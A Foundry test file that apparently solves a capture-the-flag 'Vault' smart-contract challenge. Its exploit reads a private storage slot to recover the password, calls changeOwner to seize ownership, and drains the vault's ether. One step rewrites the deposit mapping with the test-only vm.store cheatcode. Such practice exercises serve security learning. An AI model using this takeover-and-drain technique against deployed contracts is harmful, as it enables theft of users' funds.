// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.
        // 1. 获取Vault合约的logic变量值（这将作为密码）
        // logic变量存储在存储槽1中
        bytes32 logicSlot = bytes32(uint256(1));
        bytes32 logicValue = vm.load(address(vault), logicSlot);
        address logicAddress = address(uint160(uint256(logicValue)));
        bytes32 password = logicValue;
        
        // 2. 调用changeOwner函数，使用logic变量作为密码，将所有者改为palyer
        (bool success,) = address(vault).call(abi.encodeWithSignature("changeOwner(bytes32,address)", password, palyer));
        require(success, "changeOwner failed");
        
        // 3. 调用openWithdraw函数开启提现功能
        vault.openWithdraw();
        
        // 4. 修改deposites映射，将palyer的存款设置为合约的总余额
        // deposites映射存储在槽2中，使用keccak256(abi.encode(msg.sender, slot))计算存储位置
        uint256 balance = address(vault).balance;
        bytes32 depositesSlot = bytes32(uint256(2));
        bytes32 key = keccak256(abi.encode(palyer, depositesSlot));
        vm.store(address(vault), key, bytes32(balance));
        
        // 5. 调用withdraw函数提取所有资金
        vault.withdraw();

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}
